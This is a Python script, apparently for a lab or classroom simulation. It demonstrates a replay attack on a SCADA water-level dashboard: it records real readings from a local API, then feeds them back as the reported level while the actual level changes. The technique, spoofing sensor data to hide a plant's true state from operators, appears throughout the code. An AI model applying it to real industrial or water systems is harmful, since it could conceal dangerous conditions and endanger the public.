#!/usr/bin/env python3
"""
Simple SCADA Replay Attack

A straightforward implementation of a replay attack that:
1. Records normal system operation to a file
2. Replays the recorded data to show false readings
"""

import json
import time
import requests
import argparse
import os

# API endpoints
WATER_LEVEL_API = "http://localhost:5000/api/water-level"
SET_REPLAY_API = "http://localhost:5000/api/set-replay-status"

def record(duration=30, output_file="recorded_data.json"):
    """Record normal system behavior for specified duration"""
    print(f"Recording system behavior for {duration} seconds...")
    
    # Make sure data directory exists
    os.makedirs("data", exist_ok=True)
    filepath = os.path.join("data", output_file)
    
    # Store recorded data
    recorded_data = []
    
    # Record for the specified duration
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Get current water level
            response = requests.get(WATER_LEVEL_API)
            data = response.json()
            
            # Save the data with timestamp
            recorded_data.append({
                "timestamp": time.time(),
                "level": data["level"]
            })
            
            print(f"Recorded: Water Level = {data['level']:.2f}")
            time.sleep(1)  # Record once per second
            
        except Exception as e:
            print(f"Error during recording: {e}")
    
    # Save to file
    with open(filepath, "w") as f:
        json.dump(recorded_data, f)
    
    print(f"Recording complete! {len(recorded_data)} data points saved to {filepath}")
    return True

def replay(input_file="recorded_data.json"):
    """Replay recorded data from file"""
    filepath = os.path.join("data", input_file)
    
    # Load recorded data
    try:
        with open(filepath, "r") as f:
            recorded_data = json.load(f)
    except Exception as e:
        print(f"Error loading recorded data: {e}")
        return False
    
    if not recorded_data:
        print("No recorded data found.")
        return False
    
    print(f"Loaded {len(recorded_data)} data points from {filepath}")
    
    # Enable replay mode in dashboard
    try:
        response = requests.post(SET_REPLAY_API, json={"is_replay_active": True})
        if response.status_code != 200:
            print(f"Failed to set replay mode: {response.status_code}")
            return False
        print("Replay mode activated in dashboard")
    except Exception as e:
        print(f"Error activating replay mode: {e}")
        return False
    
    # Start replaying data points in a loop
    print("Starting replay attack. Press Ctrl+C to stop.")
    index = 0
    try:
        while True:
            # Get the current data point
            data_point = recorded_data[index]
            level = data_point["level"]
            
            # Get actual water level for comparison
            response = requests.get(WATER_LEVEL_API)
            actual_level = response.json()["actual_level"]
            
            # Update water level in the dashboard by setting fake data
            response = requests.post(WATER_LEVEL_API, 
                                     json={"set_reported_level": level})
            
            print(f"Replaying: Reported={level:.2f}, Actual={actual_level:.2f}")
            
            # Move to next data point or loop back to start
            index = (index + 1) % len(recorded_data)
            time.sleep(1)
    
    except KeyboardInterrupt:
        print("Replay attack stopped.")
        # Disable replay mode
        requests.post(SET_REPLAY_API, json={"is_replay_active": False})
        print("Replay mode deactivated in dashboard")
    
    return True

def main():
    parser = argparse.ArgumentParser(description="Simple SCADA Replay Attack")
    subparsers = parser.add_subparsers(dest="command")
    subparsers.required = True
    
    # Record command
    record_parser = subparsers.add_parser("record", help="Record normal system behavior")
    record_parser.add_argument("--duration", type=int, default=30, 
                              help="Recording duration in seconds")
    record_parser.add_argument("--output", type=str, default="recorded_data.json",
                              help="Output file for recorded data")
    
    # Replay command
    replay_parser = subparsers.add_parser("replay", help="Replay recorded data")
    replay_parser.add_argument("--input", type=str, default="recorded_data.json",
                              help="Input file with recorded data")
    
    args = parser.parse_args()
    
    if args.command == "record":
        record(args.duration, args.output)
    elif args.command == "replay":
        replay(args.input)

if __name__ == "__main__":
    main()